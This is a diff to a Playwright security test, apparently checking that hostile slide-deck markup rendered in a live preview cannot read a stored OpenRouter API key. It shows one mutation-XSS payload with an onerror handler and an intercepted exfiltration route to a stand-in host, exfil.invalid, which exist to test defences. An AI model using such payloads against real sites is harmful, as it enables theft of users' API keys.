@@ -46,7 +46,7 @@ const HOSTILE = [
 	`<math><mtext><table><mglyph><style><img src=x onerror="${leak('mxss')}">`,
 ].join('\n');
 
-test('@smoke a hostile deck in the preview cannot read the stored OpenRouter key', async ({ page }) => {
+test('@smoke @crosswidth @webkit-phone @webkit-tablet @gecko a hostile deck in the preview cannot read the stored OpenRouter key', async ({ page }) => {
 	test.slow();
 	const beacons: string[] = [];
 	await page.route('https://exfil.invalid/**', async (route) => {
@@ -72,9 +72,11 @@ test('@smoke a hostile deck in the preview cannot read the stored OpenRouter key
 
 	// Wait for the signal the handlers ride on: every image in the frame has settled (loaded or
 	// failed), so an `onerror` that survived would already have run, then one frame for the
-	// queued `toggle`/`load` events. Bounded by expect.poll's timeout, not a guessed sleep.
+	// queued `toggle`/`load` events.
 	const frame = page.locator(LIVE_PREVIEW).contentFrame();
-	await expect.poll(() => frame.locator('img').evaluateAll((imgs) => imgs.every((i) => (i as HTMLImageElement).complete)), { timeout: 10_000 }).toBe(true);
+	// `decode()` settles once an image has loaded or failed. Firefox never marks a refused
+	// image `complete`, so that flag is not the signal; the 10 s race only bounds a hung decode.
+	await frame.locator('img').evaluateAll((imgs) => Promise.race([Promise.allSettled(imgs.map((i) => (i as HTMLImageElement).decode())), new Promise((r) => setTimeout(r, 10_000))]));
 	await frame.locator('body').evaluate(() => new Promise((r) => requestAnimationFrame(() => requestAnimationFrame(r))));
 
 	const leaked = await page.evaluate(() => (window as unknown as { __byokLeak?: string[] }).__byokLeak ?? []);
